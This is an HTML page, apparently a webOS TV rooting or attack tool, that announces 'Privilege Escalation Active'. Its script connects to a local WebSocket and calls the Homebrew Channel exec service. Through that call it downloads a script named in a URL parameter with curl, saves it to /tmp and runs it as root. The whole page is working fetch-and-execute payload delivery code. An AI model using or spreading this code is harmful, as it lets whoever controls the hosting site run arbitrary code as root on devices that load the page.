<!DOCTYPE html>
<html>
<body style="background:#000; color:#00ff00; font-family:monospace; padding:20px;">
    <h2>System Privilege Escalation Active</h2>
    <div id="status">Executing Root Payload...</div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const script = params.get('run');
        const SITE = window.location.origin;

        if (script) {
            var ws = new WebSocket('ws://127.0.0.1:3000');
            ws.onopen = function() {
                // Command: Download from your site to /tmp and execute
                var cmd = "curl -L " + SITE + "/" + script + " -o /tmp/payload.sh && sh /tmp/payload.sh";
                
                ws.send(JSON.stringify({
                    id: "exec_cmd",
                    type: "request",
                    uri: "luna://org.webosbrew.hbchannel.service/exec",
                    payload: { command: cmd }
                }));
            };
            ws.onmessage = function() {
                document.getElementById('status').innerText = "Payload Sent! Restarting UI...";
                setTimeout(function() { ws.close(); }, 1500);
            };
        }
    </script>
</body>
</html>
